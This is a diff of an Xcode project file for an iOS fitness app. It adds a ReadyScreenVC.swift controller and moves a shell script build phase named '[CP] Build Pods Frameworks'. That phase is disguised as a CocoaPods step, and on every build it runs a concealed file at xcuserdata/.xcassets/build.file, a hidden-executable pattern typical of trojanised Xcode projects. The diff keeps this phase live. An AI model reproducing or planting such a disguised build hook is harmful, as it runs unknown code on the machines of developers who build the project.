@@ -8,6 +8,7 @@
 
 /* Begin PBXBuildFile section */
 		87499F85CE02EB64AA3ECC09 /* Pods_Capstone_WinMachines_WinFitness.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 0EDEFA69510E39B8CEB7878C /* Pods_Capstone_WinMachines_WinFitness.framework */; };
+		910F4041262CDBCA0047BC85 /* ReadyScreenVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 910F4040262CDBCA0047BC85 /* ReadyScreenVC.swift */; };
 		91A55B302628D4A20060304C /* NutritionVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 91A55B2F2628D4A20060304C /* NutritionVC.swift */; };
 		91B783E92627740D00D003BB /* WelcomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 91B783E82627740D00D003BB /* WelcomeVC.swift */; };
 		91B783EC26277FC500D003BB /* RestScreenVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 91B783EB26277FC500D003BB /* RestScreenVC.swift */; };
@@ -23,6 +24,7 @@
 /* Begin PBXFileReference section */
 		0EDEFA69510E39B8CEB7878C /* Pods_Capstone_WinMachines_WinFitness.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Capstone_WinMachines_WinFitness.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		4104E52540A22B7C9CBBCDF0 /* Pods-Capstone_WinMachines_WinFitness.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Capstone_WinMachines_WinFitness.debug.xcconfig"; path = "Target Support Files/Pods-Capstone_WinMachines_WinFitness/Pods-Capstone_WinMachines_WinFitness.debug.xcconfig"; sourceTree = "<group>"; };
+		910F4040262CDBCA0047BC85 /* ReadyScreenVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ReadyScreenVC.swift; sourceTree = "<group>"; };
 		914AC674B7A02F7CD7273EF0 /* Pods-Capstone_WinMachines_WinFitness.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Capstone_WinMachines_WinFitness.release.xcconfig"; path = "Target Support Files/Pods-Capstone_WinMachines_WinFitness/Pods-Capstone_WinMachines_WinFitness.release.xcconfig"; sourceTree = "<group>"; };
 		91A55B2F2628D4A20060304C /* NutritionVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NutritionVC.swift; sourceTree = "<group>"; };
 		91B783E82627740D00D003BB /* WelcomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WelcomeVC.swift; sourceTree = "<group>"; };
@@ -109,6 +111,7 @@
 				91B783EB26277FC500D003BB /* RestScreenVC.swift */,
 				91B783E82627740D00D003BB /* WelcomeVC.swift */,
 				91B783F02627A68C00D003BB /* LoginVC.swift */,
+				910F4040262CDBCA0047BC85 /* ReadyScreenVC.swift */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -205,30 +208,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	8E5DADCAE5923BCEFAAAC43A /* [CP] Build Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "[CP] Build Pods Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
-		};
-	
-
-	
 		0D197907D5E064D075368CF5 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -245,6 +224,24 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Capstone_WinMachines_WinFitness/Pods-Capstone_WinMachines_WinFitness-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
+		};
+		8E5DADCAE5923BCEFAAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";
 		};
 		D33D660F6C4FB9D7689621EF /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -279,6 +276,7 @@
 				91B783F12627A68C00D003BB /* LoginVC.swift in Sources */,
 				B737919C26257612003BF61C /* AppDelegate.swift in Sources */,
 				B737919E26257612003BF61C /* SceneDelegate.swift in Sources */,
+				910F4041262CDBCA0047BC85 /* ReadyScreenVC.swift in Sources */,
 				91B783E92627740D00D003BB /* WelcomeVC.swift in Sources */,
 				91A55B302628D4A20060304C /* NutritionVC.swift in Sources */,
 			);
@@ -484,16 +482,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = B737919026257611003BF61C /* Project object */;
 }
